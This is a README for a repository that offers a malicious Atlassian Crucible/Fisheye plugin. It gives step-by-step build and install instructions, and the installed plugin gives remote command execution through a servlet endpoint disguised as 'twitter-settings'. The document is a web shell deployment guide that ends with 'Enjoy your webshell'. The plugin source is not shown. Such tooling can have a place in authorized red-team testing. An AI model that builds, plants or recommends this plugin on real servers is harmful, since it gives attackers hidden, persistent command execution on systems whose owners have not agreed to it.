A malicious plugin for Atlassian Crucible/Fisheye that when installed gives command execution via `/plugins/servlet/twitter-settings?cmd=id` endpoint


#### Usage
1. Install Atlassian Plugin SDK. E.g. for MacOS:
```bash
brew tap atlassian/tap
brew install atlassian/tap/atlassian-plugin-sdk
```

2. Clone this repo & cd into it
```bash
git clone https://github.com/UgniusV/fecru-webshell-plugin.git
cd fecru-webshell-plugin
```

3. Generate a JAR by running
```bash
atlas-package
```

4. Navigate to http://crucible:8060/plugins/servlet/upm?source=side_nav_manage_addons & install the JAR
5. Enjoy your webshell at: http://crucible:8060/plugins/servlet/twitter-settings?cmd=id
